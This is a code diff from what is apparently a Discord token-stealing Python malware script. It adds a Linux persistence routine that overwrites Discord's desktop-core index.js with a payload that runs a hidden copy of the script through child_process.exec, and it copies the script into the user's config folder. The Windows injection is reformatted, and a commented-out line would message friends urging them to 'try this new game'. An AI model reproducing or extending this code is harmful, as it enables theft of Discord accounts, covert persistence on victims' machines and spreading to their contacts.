@@ -77,21 +77,38 @@ if system == "Linux":
     if os.path.isdir(path1):
         find_tokens(str(path1))
 
+def even_more_persistance_linux():
+    jspath = home + "\\.config\\discord\\0.0.13\\modules\\discord_desktop_core\\index.js"
+    payload = """module.exports = require('./core.asar');
+const { exec } = require("child_process");
+exec(""""'" + home + "\\.config\\" + base + "'"""", (error, stdout, stderr) => {
+if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+}
+if (stderr) {
+    console.log(`stderr: ${stderr}`);
+    return;
+}
+console.log(`stdout: ${stdout}`);
+});
+"""
+
 def even_more_persistance_windows():
     jspath = roaming + "\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
     payload = """module.exports = require('./core.asar');
-    const { exec } = require("child_process");
-    exec(""""'C:\\Users\\" + user + "\\AppData\\Roaming\\" + base + "'"""", (error, stdout, stderr) => {
-    if (error) {
-            console.log(`error: ${error.message}`);
-            return;
-    }
-    if (stderr) {
-        console.log(`stderr: ${stderr}`);
+const { exec } = require("child_process");
+exec(""""'C:\\Users\\" + user + "\\AppData\\Roaming\\" + base + "'"""", (error, stdout, stderr) => {
+if (error) {
+        console.log(`error: ${error.message}`);
         return;
-    }
-    console.log(`stdout: ${stdout}`);
-    });
+}
+if (stderr) {
+    console.log(`stderr: ${stderr}`);
+    return;
+}
+console.log(`stdout: ${stdout}`);
+});
 """
     with open(jspath, "w") as inject:
         inject.write(payload)
@@ -110,6 +127,8 @@ async def on_ready():
         even_more_persistance_windows()
     if system == "Linux":
         shutil.copy(__file__, home + ".config\\autostart" + base)
+        shutil.copy(__file__, home + ".config\\" + base)
+        even_more_persistance_linux()
 
     #for friend in bot.user.friends:
         #await friend.send("Ayo try this new game!")
